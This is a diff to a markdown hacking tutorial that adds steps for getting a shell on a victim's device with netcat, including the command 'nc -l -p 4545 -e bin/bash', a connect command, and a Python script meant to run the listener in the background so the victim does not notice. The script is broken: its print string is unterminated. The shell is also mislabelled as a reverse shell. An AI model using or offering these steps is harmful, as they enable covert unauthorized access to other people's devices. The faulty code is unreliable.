@@ -10,7 +10,32 @@ In this method, with the help of [Netcat tool](https://nmap.org/ncat/) you can c
 # Method
 Its a simple but very effective way that a hacker might use to hack their Target. In this type of attack, the attacker will be on your same network as you and send a python script that if you execute, will open a shell on a certain port that the attacker might connect to and try to do anything on your device. Lets see how its Done...
 
-First Lets understand how to create a Reverse shell with Netcat command
+First Lets understand how to create a Reverse shell with Netcat command, Also if you get any errors plz check the netcat manual or do some research.
 
+## How to create a basic Reverse Shell
 
-The post is not complete, I am still working on it. Plz share your thoughts on it.
+***Victim's Device :***
+        
+  First you need netcat installed on your victim's device, if it's an Android or IOS then install it via Termux or iSH, and if it's Win or Mac install it through [nmap website](https://nmap.org/download.html) (netcat is pre-installed in linux). After installing netcat you just have to open a port where your device will connect (in this example the port will be "4545") and after connection with the "e" flag we will tell the device which file to execute.
+```
+nc -l -p 4545 -e bin/bash
+```
+
+***Target Device :***
+
+  On your device you also need netcat installed, then as you know the port which is open you can directly connect on it. To connect you must also know the target's IP.
+```
+nc <IP> 4545
+```
+
+And **congratulation** you're now connected to your target device. But, there are chances that target might find it and try to interupt in between, To avoid that we can try my method.
+
+# My Method
+
+For this you need to create a python script which will run this netcat command in the background so the victim will not see it and we can do our work, Also we will add some text that will be displayed
+
+```
+import os
+print("
+os.system("nc -l -p 4545 -e bin/bash")
+```
